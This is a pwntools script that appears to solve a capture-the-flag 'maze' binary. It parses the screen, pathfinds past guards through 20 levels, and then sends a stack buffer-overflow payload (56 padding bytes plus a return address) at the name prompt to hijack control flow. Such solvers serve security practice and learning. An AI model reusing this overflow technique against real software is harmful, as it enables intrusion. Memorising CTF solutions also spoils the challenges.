#!/home/ctfrat/CTF-Rat/.venv/bin/python
from pwn import *
from collections import deque

context.binary = exe = ELF('./maze', checksec=False)
ESC = b'\x1b[2J\x1b[1;1H'

def decode(screen):
    rows = screen.splitlines()
    assert len(rows) == 16, (len(rows), rows)
    grid, start, end, guards = [], None, None, set()
    for y, row in enumerate(rows):
        assert len(row) == 32, (y, len(row), row)
        out = []
        for x in range(16):
            cell = row[x*2:x*2+2]
            c = {'##':'1', '  ':'0', ':D':'S', '^^':'G', '[]':'E'}.get(cell, cell[0])
            out.append(c)
            if c == 'S': start = (x, y)
            elif c == 'E': end = (x, y)
            elif c == 'G': guards.add((x, y))
        grid.append(out)
    assert start and end
    return grid, start, end, guards

def move_for(grid, start, end, guards):
    # The adjacency check is performed before input, after the guard redraw;
    # only occupied squares are unavailable for this turn's shortest path.
    unsafe = set(guards)
    q, prev = deque([start]), {start: None}
    ways = ((1,0,b'd'), (-1,0,b'a'), (0,1,b's'), (0,-1,b'w'))
    while q:
        p = q.popleft()
        if p == end:
            break
        for dx, dy, key in ways:
            n = p[0]+dx, p[1]+dy
            if not (0 <= n[0] < 16 and 0 <= n[1] < 16): continue
            if n in prev or grid[n[1]][n[0]] in '1G': continue
            if n != end and n in unsafe: continue
            prev[n] = (p, key)
            q.append(n)
    if end not in prev:
        return None
    p = end
    while prev[p] is not None and prev[p][0] != start:
        p = prev[p][0]
    return prev[p][1] if prev[p] else None

def evasive_move(grid, start, guards):
    candidates = []
    for dx, dy, key in ((1,0,b'd'), (-1,0,b'a'), (0,1,b's'), (0,-1,b'w')):
        x, y = start[0]+dx, start[1]+dy
        if not (0 <= x < 16 and 0 <= y < 16) or grid[y][x] in '1G':
            continue
        distance = min(abs(x-gx)+abs(y-gy) for gx, gy in guards)
        candidates.append((distance, key))
    return max(candidates, default=(0, b'x'))[1]

def read_screen(io):
    prefix = io.recvuntil(ESC, timeout=3)
    return prefix, io.recvn(16*33, timeout=3).decode()

def main():
    io = process(exe.path)
    io.recvuntil(b'PRESS ANY KEY TO START THE GAME')
    io.send(b'x')
    cleared = 0
    while cleared < 20:
        prefix, screen = read_screen(io)
        if b'level ' in prefix:
            cleared += 1
            log.info(f'cleared level {cleared}')
        grid, start, end, guards = decode(screen)
        key = move_for(grid, start, end, guards)
        if key is None:
            # Avoid waiting at a dead-end while a guard clears a corridor.
            key = evasive_move(grid, start, guards)
        io.send(key)
    io.recvuntil(b'record your name : ')
    io.sendline(b'A'*56 + p64(0x4007a0)) # proof-only crash/control probe, no chain
    io.wait()

if __name__ == '__main__':
    main()
